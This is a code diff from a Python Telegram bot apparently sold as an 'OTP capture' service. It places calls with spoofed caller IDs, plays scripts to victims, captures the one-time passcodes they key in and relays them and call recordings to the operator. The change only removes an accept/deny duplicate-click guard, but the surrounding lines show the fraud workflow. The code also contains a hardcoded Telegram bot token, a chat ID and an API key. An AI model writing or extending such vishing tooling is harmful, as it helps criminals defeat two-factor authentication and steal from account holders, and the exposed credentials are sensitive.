@@ -37,7 +37,6 @@ apiKey = '741852963741852963789456123'
 last_message_ids = {}
 ringing_handler = []
 recording_handler = {}
-accept_deny_handler = []
 
 
 updater = Updater(token=bot_tkn, use_context=True)
@@ -855,11 +854,6 @@ def custom_callmaking(number,spoof,chatid,script_id):
                 
 
 def custom_make_call(t:str,f:str,user_id,script_id:int):
-    global accept_deny_handler
-    try:
-         accept_deny_handler.remove(user_id)
-    except:
-        pass
     custom_callmaking(number=t,spoof=f,chatid=user_id,script_id=script_id)
    
 # ------------------Recall feature ---------------------------------
@@ -933,13 +927,7 @@ def custom_confirm1(message,otp_message):
         requests.post(url, json=data)
         bot.send_message(chat_id,f"*Code Accpeted ✅ *",parse_mode='markdown')
         time.sleep(3)
-        try:
-            accept_deny_handler.remove(chat_id)
-        except:
-             print("remove error")
-        finally:
-            callhangup(call_control_id)
-
+      
     elif up_resp1=='Deny':
         bot.send_message(chat_id,f"""*Code Rejected ❌*""",parse_mode='markdown')
         url = 'https://articunoapi.com:8443/gather-audio'
@@ -957,7 +945,7 @@ def custom_confirm1(message,otp_message):
         
 @app.route('/<script_id>/<chatid>/custom', methods=['POST'])
 def custom_prebuild_script_call(script_id,chatid):
-    global ringing_handler ,accept_deny_handler
+    global ringing_handler
     global recording_handler
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor()
@@ -1012,10 +1000,6 @@ def custom_prebuild_script_call(script_id,chatid):
             c.execute(f"Update users set status='active' where user_id={chatid}")
             db.commit()
             try:
-                 del accept_deny_handler[chatid]
-            except:
-                 pass
-            try:
                  recurl =  recording_handler[call_control_id]
                  send_record = threading.Thread(target=retrive_recording, args=(recurl,chatid,))
                  send_record.start()
@@ -1061,10 +1045,6 @@ def custom_prebuild_script_call(script_id,chatid):
             item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny")
             keyboard.add(item1,item2) 
             bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard)
-            try:
-                accept_deny_handler.remove(chatid)
-            except:
-                 print("remove error gather")
             requests.post(f"""https://api.telegram.org/bot6594047154:AAEkLCy48iP2fx-PVeQUlgt_XAJJJ2nPWGs/sendMessage?chat_id=-1002076456397&text=
 🚀 Articuno OTP Capture 🚀
 Another Call Was Successful 👤
@@ -1193,14 +1173,11 @@ def handle_callback(message):
         Support(message)
 
     elif message.data == '/accept':
-         if message.from_user.id not in accept_deny_handler:
             custom_confirm1(message,"Accept")
-            accept_deny_handler.append(message.from_user.id)
-    
+
     elif message.data == '/deny':
-         if message.from_user.id not in accept_deny_handler:
             custom_confirm1(message,"Deny")
-            accept_deny_handler.append(message.from_user.id)
+            
          
          
          
